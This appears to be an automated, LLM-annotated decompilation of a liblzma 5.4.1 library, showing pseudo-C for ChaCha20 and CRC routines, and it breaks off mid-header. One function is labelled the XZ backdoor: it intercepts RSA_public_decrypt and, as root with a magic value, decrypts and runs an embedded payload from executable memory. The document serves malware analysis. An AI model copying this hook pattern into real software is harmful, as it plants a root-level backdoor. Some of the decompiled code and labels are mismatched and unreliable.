/* ============================================================
 * Binary:   liblzma.so.5.4.1
 * Arch:     x86
 * Format:   Executable and Linking Format (ELF)
 * Compiler: gcc
 *
 * Functions: 396 total, 319 analyzed, 40 skipped, 37 errors
 * Renamed:   118 | Confirmed: 201
 * LLM calls: 319
 * Duration:  15m 14.0s
 * Cost:      $6.2441
 * ============================================================ */

/* ==================== Crypto ==================== */

/**
 * @name  initialize_cipher_context
 * @brief ChaCha20 cipher context initialization: clears state, copies 256-bit key and 96-bit nonce, sets magic constants and counter.
 * @confidence 92%
 * @classification crypto
 * @address 0x001093f0
 */

/* Initializes a cipher context structure with key and IV material. Clears context, copies key/IV to
   specific offsets, sets magic constants and counter values. */

void initialize_cipher_context
               (undefined8 *param_1,undefined8 *param_2,undefined8 *param_3,undefined8 param_4)

{
  undefined4 uVar1;
  undefined8 uVar2;
  ulong uVar3;
  undefined8 *puVar4;
  
  *param_1 = 0;
  param_1[0x17] = 0;
  puVar4 = (undefined8 *)((ulong)(param_1 + 1) & 0xfffffffffffffff8);
  for (uVar3 = (ulong)(((int)param_1 -
                       (int)(undefined8 *)((ulong)(param_1 + 1) & 0xfffffffffffffff8)) + 0xc0U >> 3)
      ; uVar3 != 0; uVar3 = uVar3 - 1) {
    *puVar4 = 0;
    puVar4 = puVar4 + 1;
  }
  uVar2 = param_2[1];
  param_1[9] = *param_2;
  param_1[10] = uVar2;
  uVar2 = param_2[3];
  param_1[0xb] = param_2[2];
  param_1[0xc] = uVar2;
  param_1[0xd] = *param_3;
  uVar1 = *(undefined4 *)(param_3 + 1);
  param_1[0x10] = 0x3320646e61707865;
  *(undefined4 *)(param_1 + 0xe) = uVar1;
  param_1[0x11] = 0x6b20657479622d32;
  *(undefined4 *)(param_1 + 0x12) = *(undefined4 *)param_2;
  *(undefined4 *)((long)param_1 + 0x94) = *(undefined4 *)((long)param_2 + 4);
  *(undefined4 *)(param_1 + 0x13) = *(undefined4 *)(param_2 + 1);
  *(undefined4 *)((long)param_1 + 0x9c) = *(undefined4 *)((long)param_2 + 0xc);
  *(undefined4 *)(param_1 + 0x14) = *(undefined4 *)(param_2 + 2);
  *(undefined4 *)((long)param_1 + 0xa4) = *(undefined4 *)((long)param_2 + 0x14);
  *(undefined4 *)(param_1 + 0x15) = *(undefined4 *)(param_2 + 3);
  uVar1 = *(undefined4 *)((long)param_2 + 0x1c);
  *(undefined4 *)(param_1 + 0x16) = 0;
  *(undefined4 *)((long)param_1 + 0xac) = uVar1;
  *(undefined4 *)((long)param_1 + 0xb4) = *(undefined4 *)param_3;
  *(undefined4 *)(param_1 + 0x17) = *(undefined4 *)((long)param_3 + 4);
  *(undefined4 *)((long)param_1 + 0xbc) = *(undefined4 *)(param_3 + 1);
  param_1[0xd] = *param_3;
  uVar1 = *(undefined4 *)(param_3 + 1);
  *(int *)(param_1 + 0x16) = (int)param_4;
  *(undefined4 *)(param_1 + 0xe) = uVar1;
  *(int *)((long)param_1 + 0xb4) = (int)((ulong)param_4 >> 0x20) + *(int *)(param_1 + 0xd);
  param_1[0xf] = param_4;
  param_1[8] = 0x40;
  return;
}



/**
 * @name  chacha20_encrypt
 * @brief ChaCha20 stream cipher. Implements 20 rounds (10 double-rounds) with quarter-round operations (add, XOR, rotate 16/12/8/7). Generates 64-byte keystream blocks, XORs with data, increments counter.
 * @confidence 95%
 * @classification crypto
 * @address 0x00109520
 */

/* ChaCha20 stream cipher encryption/decryption. Implements 20 rounds (10 double-rounds) with
   quarter-round operations (add, XOR, rotate by 16/12/8/7). Generates 64-byte keystream blocks,
   XORs with data, increments block counter. State layout: 0x00-0x3F=working state, 0x40=byte
   offset, 0x80+=original state. */

void chacha20_encrypt(ulong *param_1,byte *param_2,long param_3)

{
  ulong *puVar1;
  uint uVar2;
  uint uVar3;
  ulong *puVar4;
  ulong uVar5;
  ulong *puVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  uint uVar10;
  uint uVar11;
  uint uVar12;
  uint uVar13;
  uint uVar14;
  uint uVar15;
  uint uVar16;
  uint uVar17;
  uint uVar18;
  uint uVar19;
  uint uVar20;
  uint local_68;
  uint local_64;
  byte *local_60;
  int local_54;
  
  if (param_3 == 0) {
    return;
  }
  puVar1 = param_1 + 8;
  uVar5 = *puVar1;
  local_60 = param_2;
  do {
    puVar4 = param_1;
    if (uVar5 < 0x40) {
      puVar4 = (ulong *)(uVar5 + (long)param_1);
    }
    else {
      do {
        puVar6 = (ulong *)((long)puVar4 + 4);
        *(int *)puVar4 = (int)puVar4[0x10];
        puVar4 = puVar6;
      } while (puVar1 != puVar6);
      local_64 = (uint)param_1[3];
      uVar18 = (uint)*param_1;
      local_54 = 10;
      uVar3 = (uint)param_1[2];
      uVar7 = (uint)param_1[6];
      uVar13 = (uint)param_1[4];
      uVar14 = *(uint *)((long)param_1 + 4);
      uVar2 = (uint)param_1[7];
      uVar16 = *(uint *)((long)param_1 + 0x14);
      uVar8 = *(uint *)((long)param_1 + 0x34);
      uVar12 = *(uint *)((long)param_1 + 0x24);
      uVar9 = (uint)param_1[1];
      uVar17 = (uint)param_1[5];
      local_68 = *(uint *)((long)param_1 + 0x2c);
      uVar11 = *(uint *)((long)param_1 + 0xc);
      uVar20 = *(uint *)((long)param_1 + 0x1c);
      uVar19 = *(uint *)((long)param_1 + 0x3c);
      do {
        uVar8 = uVar8 ^ uVar14 + uVar16;
        uVar7 = uVar7 ^ uVar18 + uVar3;
        uVar8 = uVar8 << 0x10 | uVar8 >> 0x10;
        uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
        uVar12 = uVar12 + uVar8;
        uVar13 = uVar13 + uVar7;
        uVar15 = uVar16 ^ uVar12;
        uVar10 = uVar3 ^ uVar13;
        uVar15 = uVar15 << 0xc | uVar15 >> 0x14;
        uVar10 = uVar10 << 0xc | uVar10 >> 0x14;
        uVar14 = uVar14 + uVar16 + uVar15;
        uVar18 = uVar18 + uVar3 + uVar10;
        uVar8 = uVar8 ^ uVar14;
        uVar7 = uVar7 ^ uVar18;
        uVar8 = uVar8 << 8 | uVar8 >> 0x18;
        uVar7 = uVar7 << 8 | uVar7 >> 0x18;
        uVar12 = uVar12 + uVar8;
        uVar13 = uVar13 + uVar7;
        uVar10 = uVar10 ^ uVar13;
        uVar15 = uVar15 ^ uVar12;
        uVar10 = uVar10 << 7 | uVar10 >> 0x19;
        uVar16 = uVar15 << 7 | uVar15 >> 0x19;
        uVar2 = uVar2 ^ uVar9 + local_64;
        uVar3 = uVar2 << 0x10 | uVar2 >> 0x10;
        uVar17 = uVar17 + uVar3;
        uVar2 = local_64 ^ uVar17;
        uVar2 = uVar2 << 0xc | uVar2 >> 0x14;
        uVar9 = uVar9 + local_64 + uVar2;
        uVar3 = uVar3 ^ uVar9;
        uVar3 = uVar3 << 8 | uVar3 >> 0x18;
        uVar17 = uVar17 + uVar3;
        uVar18 = uVar18 + uVar16;
        uVar19 = uVar19 ^ uVar11 + uVar20;
        uVar2 = uVar2 ^ uVar17;
        uVar19 = uVar19 << 0x10 | uVar19 >> 0x10;
        uVar2 = uVar2 << 7 | uVar2 >> 0x19;
        local_68 = local_68 + uVar19;
        uVar14 = uVar14 + uVar2;
        uVar15 = uVar20 ^ local_68;
        uVar7 = uVar7 ^ uVar14;
        uVar15 = uVar15 << 0xc | uVar15 >> 0x14;
        uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
        uVar11 = uVar11 + uVar20 + uVar15;
        uVar19 = uVar19 ^ uVar11;
        uVar20 = uVar19 << 8 | uVar19 >> 0x18;
        local_68 = local_68 + uVar20;
        uVar20 = uVar20 ^ uVar18;
        uVar20 = uVar20 << 0x10 | uVar20 >> 0x10;
        uVar15 = uVar15 ^ local_68;
        local_68 = local_68 + uVar7;
        uVar17 = uVar17 + uVar20;
        uVar2 = uVar2 ^ local_68;
        uVar15 = uVar15 << 7 | uVar15 >> 0x19;
        uVar16 = uVar16 ^ uVar17;
        uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
        uVar18 = uVar18 + uVar16;
        uVar20 = uVar20 ^ uVar18;
        uVar19 = uVar20 << 8 | uVar20 >> 0x18;
        uVar17 = uVar17 + uVar19;
        uVar16 = uVar16 ^ uVar17;
        uVar16 = uVar16 << 7 | uVar16 >> 0x19;
        uVar20 = uVar2 << 0xc | uVar2 >> 0x14;
        uVar9 = uVar9 + uVar15;
        uVar14 = uVar14 + uVar20;
        uVar8 = uVar8 ^ uVar9;
        uVar7 = uVar7 ^ uVar14;
        uVar2 = uVar8 << 0x10 | uVar8 >> 0x10;
        uVar7 = uVar7 << 8 | uVar7 >> 0x18;
        uVar13 = uVar13 + uVar2;
        local_68 = local_68 + uVar7;
        uVar15 = uVar15 ^ uVar13;
        uVar20 = uVar20 ^ local_68;
        uVar15 = uVar15 << 0xc | uVar15 >> 0x14;
        uVar9 = uVar9 + uVar15;
        local_64 = uVar20 << 7 | uVar20 >> 0x19;
        uVar2 = uVar2 ^ uVar9;
        uVar11 = uVar11 + uVar10;
        uVar8 = uVar2 << 8 | uVar2 >> 0x18;
        uVar3 = uVar3 ^ uVar11;
        uVar13 = uVar13 + uVar8;
        uVar3 = uVar3 << 0x10 | uVar3 >> 0x10;
        uVar15 = uVar15 ^ uVar13;
        uVar12 = uVar12 + uVar3;
        uVar20 = uVar15 << 7 | uVar15 >> 0x19;
        uVar10 = uVar10 ^ uVar12;
        uVar10 = uVar10 << 0xc | uVar10 >> 0x14;
        uVar11 = uVar11 + uVar10;
        uVar3 = uVar3 ^ uVar11;
        uVar2 = uVar3 << 8 | uVar3 >> 0x18;
        uVar12 = uVar12 + uVar2;
        uVar10 = uVar10 ^ uVar12;
        uVar3 = uVar10 << 7 | uVar10 >> 0x19;
        local_54 = local_54 - 1;
      } while (local_54 != 0);
      *(uint *)((long)param_1 + 0x34) = uVar8;
      *(uint *)(param_1 + 3) = local_64;
      *(uint *)param_1 = uVar18;
      *(uint *)(param_1 + 7) = uVar2;
      *(uint *)(param_1 + 2) = uVar3;
      *(uint *)((long)param_1 + 0x2c) = local_68;
      *(uint *)(param_1 + 6) = uVar7;
      *(uint *)(param_1 + 4) = uVar13;
      *(uint *)((long)param_1 + 4) = uVar14;
      *(uint *)((long)param_1 + 0x14) = uVar16;
      *(uint *)((long)param_1 + 0x24) = uVar12;
      *(uint *)(param_1 + 1) = uVar9;
      *(uint *)(param_1 + 5) = uVar17;
      *(uint *)((long)param_1 + 0xc) = uVar11;
      *(uint *)((long)param_1 + 0x1c) = uVar20;
      *(uint *)((long)param_1 + 0x3c) = uVar19;
      puVar4 = param_1;
      while( true ) {
        puVar6 = (ulong *)((long)puVar4 + 4);
        *(uint *)puVar4 = uVar18 + (int)puVar4[0x10];
        if (puVar1 == puVar6) break;
        uVar18 = *(uint *)puVar6;
        puVar4 = puVar6;
      }
      puVar4 = param_1 + 0x16;
      *(int *)puVar4 = (int)*puVar4 + 1;
      if ((int)*puVar4 == 0) {
        *(int *)((long)param_1 + 0xb4) = *(int *)((long)param_1 + 0xb4) + 1;
      }
      param_1[8] = 0;
      puVar4 = param_1;
    }
    *local_60 = *local_60 ^ (byte)*puVar4;
    local_60 = local_60 + 1;
    uVar5 = param_1[8] + 1;
    param_1[8] = uVar5;
  } while (param_2 + param_3 != local_60);
  return;
}



/**
 * @name  rsa_public_decrypt_wrapper
 * @brief XZ backdoor: intercepts RSA_public_decrypt. When running as root and magic value matches, decrypts and executes shellcode via ChaCha20.
 * @confidence 95%
 * @classification crypto
 * @address 0x00109820
 */

/* Wrapper around RSA_public_decrypt that performs verification when running as root by mapping and
   executing verification code */

void rsa_public_decrypt_wrapper
               (undefined4 param_1,int *param_2,undefined8 param_3,undefined8 param_4,
               undefined4 param_5)

{
  __uid_t _Var1;
  code *pcVar2;
  void *__dest;
  char *pcVar3;
  long in_FS_OFFSET;
  undefined1 local_108 [200];
  long local_40;
  
  local_40 = *(long *)(in_FS_OFFSET + 0x28);
  _Var1 = getuid();
  pcVar3 = "RSA_public_decrypt";
  if (_Var1 == 0) {
    if (*param_2 == -0x3abf85b8) {
      initialize_cipher_context(local_108,param_2 + 1,param_2 + 9,0);
      __dest = mmap((void *)0x0,(long)DAT_00132360,7,0x22,-1,0);
      pcVar2 = memcpy(__dest,&DAT_00123960,(long)DAT_00132360);
      chacha20_encrypt(local_108,pcVar2,(long)DAT_00132360);
      (*pcVar2)();
      initialize_cipher_context(local_108,param_2 + 1,param_2 + 9,0);
      chacha20_encrypt(local_108,pcVar2,(long)DAT_00132360);
    }
    pcVar3 = "RSA_public_decrypt ";
  }
  pcVar2 = (code *)dlsym(0,pcVar3);
  (*pcVar2)(param_1,param_2,param_3,param_4,param_5);
  if (local_40 == *(long *)(in_FS_OFFSET + 0x28)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



/**
 * @name  lzma_check_update
 * @brief Updates checksum: dispatches to lzma_crc32 for type 1, lzma_crc64 for type 4, SHA-256 streaming for type 10.
 * @confidence 85%
 * @classification crypto
 * @address 0x00114b50
 */

/* Updates a checksum field based on the type parameter: calls lzma_crc64 for type 4, lzma_crc32 for
   type 1, or FUN_001163b0 for type 10 */

void update_checksum(long param_1,int param_2,undefined8 param_3,undefined8 param_4)

{
  undefined8 uVar1;
  undefined4 uVar2;
  
  if (param_2 == 4) {
    uVar1 = lzma_crc64(param_3,param_4,*(undefined8 *)(param_1 + 0x40));
    *(undefined8 *)(param_1 + 0x40) = uVar1;
    return;
  }
  if (param_2 != 10) {
    if (param_2 != 1) {
      return;
    }
    uVar2 = lzma_crc32(param_3,param_4,*(undefined4 *)(param_1 + 0x40));
    *(undefined4 *)(param_1 + 0x40) = uVar2;
    return;
  }
  hash_update_streaming(param_3,param_4,param_1);
  return;
}



/**
 * @name  lzma_check_finish
 * @brief Finalizes integrity check by type: copies CRC32/CRC64 or calls SHA-256 finalize
 * @confidence 85%
 * @classification crypto
 * @address 0x00114bb0
 */

/* Dispatches check finalization: CRC64 copy, CRC32 copy, or SHA256 finalize */

void lzma_check_finish(undefined8 *param_1,int param_2)

{
  if (param_2 == 4) {
    *param_1 = param_1[8];
    return;
  }
  if (param_2 != 10) {
    if (param_2 != 1) {
      return;
    }
    *(undefined4 *)param_1 = *(undefined4 *)(param_1 + 8);
    return;
  }
  sha256_finalize();
  return;
}



/**
 * @name  lzma_crc32_generic
 * @brief Software CRC32 computation using 8-way lookup tables with 8-byte chunk processing.
 * @confidence 92%
 * @classification crypto
 * @address 0x00114bf0
 */

/* Computes CRC32 checksum over input data using lookup tables with optimized 8-byte chunk
   processing */

uint crc32_compute(uint *param_1,byte *param_2,uint param_3)

{
  uint uVar1;
  byte *pbVar2;
  uint *puVar3;
  uint *puVar4;
  uint *puVar5;
  
  param_3 = ~param_3;
  puVar3 = param_1;
  pbVar2 = param_2;
  if ((byte *)0x8 < param_2) {
    while (((ulong)puVar3 & 7) != 0) {
      param_3 = param_3 >> 8 ^
                *(uint *)(&crc32_lookup_table + (ulong)(((byte)*puVar3 ^ param_3) & 0xff) * 4);
      pbVar2 = (byte *)((long)param_1 + ((long)param_2 - ((long)puVar3 + 1)));
      puVar3 = (uint *)((long)puVar3 + 1);
    }
    param_2 = (byte *)(ulong)((uint)pbVar2 & 7);
    puVar5 = (uint *)(((ulong)pbVar2 & 0xfffffffffffffff8) + (long)puVar3);
    puVar4 = puVar3;
    if (puVar3 < puVar5) {
      do {
        uVar1 = puVar4[1];
        param_3 = param_3 ^ *puVar4;
        puVar4 = puVar4 + 2;
        param_3 = *(uint *)(&DAT_00125660 + (ulong)(uVar1 & 0xff) * 4) ^
                  *(uint *)(&crc32_lookup_table + (ulong)(uVar1 >> 0x18) * 4) ^
                  *(uint *)(&DAT_00126660 + (ulong)(param_3 & 0xff) * 4) ^
                  *(uint *)(&DAT_00125a60 + (ulong)(param_3 >> 0x18) * 4) ^
                  *(uint *)(&DAT_00125260 + (ulong)(uVar1 >> 8 & 0xff) * 4) ^
                  *(uint *)(&DAT_00124e60 + (ulong)(uVar1 >> 0x10 & 0xff) * 4) ^
                  *(uint *)(&DAT_00126260 + (ulong)(param_3 >> 8 & 0xff) * 4) ^
                  *(uint *)(&DAT_00125e60 + (ulong)(param_3 >> 0x10 & 0xff) * 4);
      } while (puVar4 < puVar5);
      puVar3 = (uint *)((long)puVar3 +
                       ((ulong)((long)puVar5 + ~(ulong)puVar3) & 0xfffffffffffffff8) + 8);
    }
  }
  if (param_2 != (byte *)0x0) {
    puVar4 = (uint *)((long)puVar3 + (long)param_2);
    do {
      uVar1 = *puVar3;
      puVar3 = (uint *)((long)puVar3 + 1);
      param_3 = param_3 >> 8 ^
                *(uint *)(&crc32_lookup_table + (ulong)(((byte)uVar1 ^ param_3) & 0xff) * 4);
    } while (puVar3 != puVar4);
  }
  return ~param_3;
}



/**
 * @name  lzma_crc32_clmul
 * @brief CRC-32 computation using CLMUL instructions (emulated via bit-by-bit polynomial multiplication). Uses fold and Barrett reduction constants. Returns inverted CRC-32.
 * @confidence 88%
 * @classification crypto
 * @address 0x00114d20
 */

/* WARNING: Removing unreachable block (ram,0x00114e8e) */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */
/* CRC computation using CLMUL instructions emulated via bit-by-bit polynomial multiplication. Uses
   fold constants from 0x126a80/0x126a88 and Barrett reduction constants from 0x126a90/0x126aa0.
   Despite the name suggesting CRC-64, the return type and final reduction suggest this may be
   CRC-32 variant. Returns inverted CRC. */

uint lzma_crc64_clmul(ulong param_1,ulong param_2,uint param_3)

{
  undefined1 (*pauVar1) [16];
  undefined1 auVar2 [32];
  undefined1 auVar3 [16];
  undefined1 auVar4 [16];
  undefined1 auVar5 [16];
  undefined1 auVar6 [16];
  undefined1 auVar7 [16];
  undefined1 auVar8 [16];
  undefined1 auVar9 [16];
  undefined1 auVar10 [16];
  undefined1 auVar11 [16];
  undefined1 auVar12 [16];
  undefined1 auVar13 [16];
  undefined1 auVar14 [16];
  undefined1 auVar15 [16];
  undefined1 auVar16 [16];
  undefined1 auVar17 [16];
  undefined1 (*pauVar18) [16];
  undefined1 (*pauVar19) [16];
  long lVar20;
  uint uVar21;
  undefined1 (*pauVar22) [16];
  undefined1 (*pauVar23) [16];
  undefined1 auVar24 [16];
  undefined1 auVar25 [16];
  ulong uVar26;
  undefined1 auVar27 [16];
  undefined1 auVar28 [16];
  undefined1 auVar29 [16];
  undefined1 auVar30 [16];
  
  if (param_2 != 0) {
    uVar21 = (uint)param_1 & 0xf;
    pauVar23 = (undefined1 (*) [16])(param_1 & 0xfffffffffffffff0);
    auVar24 = pshufb(ZEXT416(uVar21),(undefined1  [16])0x0);
    uVar26 = param_2 + uVar21;
    auVar29[0] = clmul_shuffle_mask - auVar24[0];
    auVar29[1] = UNK_00126a61 - auVar24[1];
    auVar29[2] = UNK_00126a62 - auVar24[2];
    auVar29[3] = UNK_00126a63 - auVar24[3];
    auVar29[4] = UNK_00126a64 - auVar24[4];
    auVar29[5] = UNK_00126a65 - auVar24[5];
    auVar29[6] = UNK_00126a66 - auVar24[6];
    auVar29[7] = UNK_00126a67 - auVar24[7];
    auVar29[8] = UNK_00126a68 - auVar24[8];
    auVar29[9] = UNK_00126a69 - auVar24[9];
    auVar29[10] = UNK_00126a6a - auVar24[10];
    auVar29[0xb] = UNK_00126a6b - auVar24[0xb];
    auVar29[0xc] = UNK_00126a6c - auVar24[0xc];
    auVar29[0xd] = UNK_00126a6d - auVar24[0xd];
    auVar29[0xe] = UNK_00126a6e - auVar24[0xe];
    auVar29[0xf] = UNK_00126a6f - auVar24[0xf];
    auVar24 = pshufb(ZEXT416(-((uint)param_1 + (int)param_2) & 0xf),(undefined1  [16])0x0);
    auVar28[0] = clmul_shuffle_mask - auVar24[0];
    auVar28[1] = UNK_00126a61 - auVar24[1];
    auVar28[2] = UNK_00126a62 - auVar24[2];
    auVar28[3] = UNK_00126a63 - auVar24[3];
    auVar28[4] = UNK_00126a64 - auVar24[4];
    auVar28[5] = UNK_00126a65 - auVar24[5];
    auVar28[6] = UNK_00126a66 - auVar24[6];
    auVar28[7] = UNK_00126a67 - auVar24[7];
    auVar28[8] = UNK_00126a68 - auVar24[8];
    auVar28[9] = UNK_00126a69 - auVar24[9];
    auVar28[10] = UNK_00126a6a - auVar24[10];
    auVar28[0xb] = UNK_00126a6b - auVar24[0xb];
    auVar28[0xc] = UNK_00126a6c - auVar24[0xc];
    auVar28[0xd] = UNK_00126a6d - auVar24[0xd];
    auVar28[0xe] = UNK_00126a6e - auVar24[0xe];
    auVar28[0xf] = UNK_00126a6f - auVar24[0xf];
    auVar30 = pblendvb(*pauVar23,(undefined1  [16])0x0,auVar29);
    auVar24 = ZEXT416(~param_3);
    if (param_2 < 0x11) {
      auVar29 = pshufb(ZEXT416((int)param_2 - 0x10),(undefined1  [16])0x0);
      auVar27[0] = auVar29[0] + clmul_shuffle_mask;
      auVar27[1] = auVar29[1] + UNK_00126a61;
      auVar27[2] = auVar29[2] + UNK_00126a62;
      auVar27[3] = auVar29[3] + UNK_00126a63;
      auVar27[4] = auVar29[4] + UNK_00126a64;
      auVar27[5] = auVar29[5] + UNK_00126a65;
      auVar27[6] = auVar29[6] + UNK_00126a66;
      auVar27[7] = auVar29[7] + UNK_00126a67;
      auVar27[8] = auVar29[8] + UNK_00126a68;
      auVar27[9] = auVar29[9] + UNK_00126a69;
      auVar27[10] = auVar29[10] + UNK_00126a6a;
      auVar27[0xb] = auVar29[0xb] + UNK_00126a6b;
      auVar27[0xc] = auVar29[0xc] + UNK_00126a6c;
      auVar27[0xd] = auVar29[0xd] + UNK_00126a6d;
      auVar27[0xe] = auVar29[0xe] + UNK_00126a6e;
      auVar27[0xf] = auVar29[0xf] + UNK_00126a6f;
      auVar29 = pshufb(auVar24,auVar27);
      auVar24 = pshufb(auVar24,auVar27 ^ _clmul_xor_mask);
      if (uVar26 < 0x11) {
        auVar28 = pshufb(auVar30,auVar28);
      }
      else {
        auVar30 = pshufb(auVar30,_clmul_xor_mask ^ auVar28);
        auVar29 = auVar29 ^ auVar30;
        auVar28 = pshufb(pauVar23[1],auVar28);
      }
      uVar26 = SUB168(auVar28 ^ auVar29,0);
      auVar2._16_16_ = auVar24;
      auVar2._0_16_ = auVar28 ^ auVar29;
      auVar24 = auVar2._8_16_;
    }
    else {
      pauVar1 = (undefined1 (*) [16])(*pauVar23 + uVar26);
      pauVar22 = pauVar23 + 2;
      auVar27 = pshufb(auVar24,auVar29);
      auVar27 = auVar27 ^ auVar30;
      auVar24 = pshufb(auVar24,auVar29 ^ _clmul_xor_mask);
      auVar24 = auVar24 ^ pauVar23[1];
      pauVar18 = pauVar22;
      if (pauVar22 < pauVar1) {
        do {
          auVar13._8_8_ = 0;
          auVar13._0_8_ = auVar27._8_8_;
          auVar14._8_8_ = 0;
          auVar14._0_8_ = _UNK_00126a88;
          auVar30 = (undefined1  [16])0x0;
          for (uVar21 = 0; uVar21 < 0x40; uVar21 = uVar21 + 1) {
            if ((auVar13 & (undefined1  [16])0x1 << uVar21) != (undefined1  [16])0x0) {
              auVar30 = auVar30 ^ auVar14 << uVar21;
            }
          }
          pauVar19 = pauVar18 + 1;
          auVar3._8_8_ = 0;
          auVar3._0_8_ = auVar27._0_8_;
          auVar6._8_8_ = 0;
          auVar6._0_8_ = _DAT_00126a80;
          auVar29 = (undefined1  [16])0x0;
          for (uVar21 = 0; uVar21 < 0x40; uVar21 = uVar21 + 1) {
            if ((auVar3 & (undefined1  [16])0x1 << uVar21) != (undefined1  [16])0x0) {
              auVar29 = auVar29 ^ auVar6 << uVar21;
            }
          }
          auVar27 = auVar30 ^ auVar29 ^ auVar24;
          auVar24 = *pauVar18;
          pauVar18 = pauVar19;
        } while (pauVar19 < pauVar1);
        lVar20 = ((ulong)((long)pauVar1 + (-0x21 - (long)pauVar23)) & 0xfffffffffffffff0) + 0x10;
        if (pauVar1 < (undefined1 (*) [16])(pauVar23[2] + 1)) {
          lVar20 = 0x10;
        }
        pauVar22 = (undefined1 (*) [16])(*pauVar22 + lVar20);
      }
      if (pauVar1 != pauVar22) {
        auVar24 = pshufb(auVar24,auVar28);
        auVar30 = pshufb(auVar27,_clmul_xor_mask ^ auVar28);
        auVar27 = pshufb(auVar27,auVar28);
        auVar24 = auVar24 | auVar30;
      }
      auVar30._8_8_ = 0;
      auVar30._0_8_ = auVar27._8_8_;
      auVar15._8_8_ = 0;
      auVar15._0_8_ = _UNK_00126a88;
      auVar28 = (undefined1  [16])0x0;
      for (uVar21 = 0; uVar21 < 0x40; uVar21 = uVar21 + 1) {
        if ((auVar30 & (undefined1  [16])0x1 << uVar21) != (undefined1  [16])0x0) {
          auVar28 = auVar28 ^ auVar15 << uVar21;
        }
      }
      auVar4._8_8_ = 0;
      auVar4._0_8_ = auVar27._0_8_;
      auVar7._8_8_ = 0;
      auVar7._0_8_ = _DAT_00126a80;
      auVar30 = (undefined1  [16])0x0;
      for (uVar21 = 0; uVar21 < 0x40; uVar21 = uVar21 + 1) {
        if ((auVar4 & (undefined1  [16])0x1 << uVar21) != (undefined1  [16])0x0) {
          auVar30 = auVar30 ^ auVar7 << uVar21;
        }
      }
      auVar24 = auVar28 ^ auVar30 ^ auVar24;
      uVar26 = auVar24._0_8_;
      auVar24 = auVar24 >> 0x40;
    }
    auVar9._8_8_ = 0;
    auVar9._0_8_ = uVar26;
    auVar11._8_8_ = 0;
    auVar11._0_8_ = _UNK_00126a88;
    auVar28 = (undefined1  [16])0x0;
    for (uVar21 = 0; uVar21 < 0x40; uVar21 = uVar21 + 1) {
      if ((auVar9 & (undefined1  [16])0x1 << uVar21) != (undefined1  [16])0x0) {
        auVar28 = auVar28 ^ auVar11 << uVar21;
      }
    }
    auVar24 = auVar24 ^ auVar28;
    auVar25._4_4_ = auVar24._4_4_;
    auVar25._0_4_ = auVar24._12_4_;
    auVar25._8_4_ = auVar24._8_4_;
    auVar25._12_4_ = auVar24._12_4_;
    auVar16._8_8_ = 0;
    auVar16._0_8_ = auVar24._0_8_ << 0x20;
    auVar17._8_8_ = 0;
    auVar17._0_8_ = _DAT_00126a90;
    auVar24 = (undefined1  [16])0x0;
    for (uVar21 = 0; uVar21 < 0x40; uVar21 = uVar21 + 1) {
      if ((auVar16 & (undefined1  [16])0x1 << uVar21) != (undefined1  [16])0x0) {
        auVar24 = auVar24 ^ auVar17 << uVar21;
      }
    }
    auVar10._8_8_ = 0;
    auVar10._0_8_ = SUB168(auVar24 ^ auVar25,0);
    auVar12._8_8_ = 0;
    auVar12._0_8_ = _UNK_00126aa8;
    auVar28 = (undefined1  [16])0x0;
    for (uVar21 = 0; uVar21 < 0x40; uVar21 = uVar21 + 1) {
      if ((auVar10 & (undefined1  [16])0x1 << uVar21) != (undefined1  [16])0x0) {
        auVar28 = auVar28 ^ auVar12 << uVar21;
      }
    }
    auVar5._8_8_ = 0;
    auVar5._0_8_ = auVar28._0_8_;
    auVar8._8_8_ = 0;
    auVar8._0_8_ = _DAT_00126aa0;
    auVar28 = (undefined1  [16])0x0;
    for (uVar21 = 0; uVar21 < 0x40; uVar21 = uVar21 + 1) {
      if ((auVar5 & (undefined1  [16])0x1 << uVar21) != (undefined1  [16])0x0) {
        auVar28 = auVar28 ^ auVar8 << uVar21;
      }
    }
    param_3 = ~(SUB164(auVar24 ^ auVar25,8) ^ auVar28._8_4_);
  }
  return param_3;
}



/**
 * @name  lzma_crc64_generic
 * @brief Software CRC64 computation using 4-way lookup tables with word-at-a-time processing.
 * @confidence 88%
 * @classification crypto
 * @address 0x00114f40
 */

/* Computes CRC32 checksum by processing data with lookup table operations. Uses byte-by-byte and
   word-by-word processing with XOR operations and table lookups at fixed offsets. */

ulong crc32_process_block(uint *param_1,byte *param_2,ulong param_3)

{
  byte *pbVar1;
  uint uVar2;
  uint *puVar3;
  uint *puVar4;
  uint *puVar5;
  uint *puVar6;
  
  param_3 = ~param_3;
  puVar4 = param_1;
  pbVar1 = param_2;
  if ((byte *)0x4 < param_2) {
    while (((ulong)puVar4 & 3) != 0) {
      param_3 = param_3 >> 8 ^
                *(ulong *)(&DAT_00126ac0 + (ulong)(((uint)(byte)*puVar4 ^ (uint)param_3) & 0xff) * 8
                          );
      pbVar1 = (byte *)((long)param_1 + ((long)param_2 - ((long)puVar4 + 1)));
      puVar4 = (uint *)((long)puVar4 + 1);
    }
    param_2 = (byte *)(ulong)((uint)pbVar1 & 3);
    puVar6 = (uint *)(((ulong)pbVar1 & 0xfffffffffffffffc) + (long)puVar4);
    puVar3 = puVar4;
    if (puVar4 < puVar6) {
      do {
        puVar5 = puVar3 + 1;
        uVar2 = *puVar3 ^ (uint)param_3;
        param_3 = param_3 >> 0x20 ^
                  *(ulong *)(&DAT_001282c0 + (ulong)(uVar2 & 0xff) * 8) ^
                  *(ulong *)(&DAT_00126ac0 + (ulong)(uVar2 >> 0x18) * 8) ^
                  *(ulong *)(&DAT_00127ac0 + (ulong)(uVar2 >> 8 & 0xff) * 8) ^
                  *(ulong *)(&DAT_001272c0 + (ulong)(uVar2 >> 0x10 & 0xff) * 8);
        puVar3 = puVar5;
      } while (puVar5 < puVar6);
      puVar4 = (uint *)((long)puVar4 +
                       ((ulong)((long)puVar6 + ~(ulong)puVar4) & 0xfffffffffffffffc) + 4);
    }
  }
  if (param_2 != (byte *)0x0) {
    puVar3 = (uint *)(param_2 + (long)puVar4);
    do {
      uVar2 = *puVar4;
      puVar4 = (uint *)((long)puVar4 + 1);
      param_3 = param_3 >> 8 ^
                *(ulong *)(&DAT_00126ac0 + (ulong)(((uint)(byte)uVar2 ^ (uint)param_3) & 0xff) * 8);
    } while (puVar4 != puVar3);
  }
  return ~param_3;
}



/**
 * @name  lzma_crc64_clmul
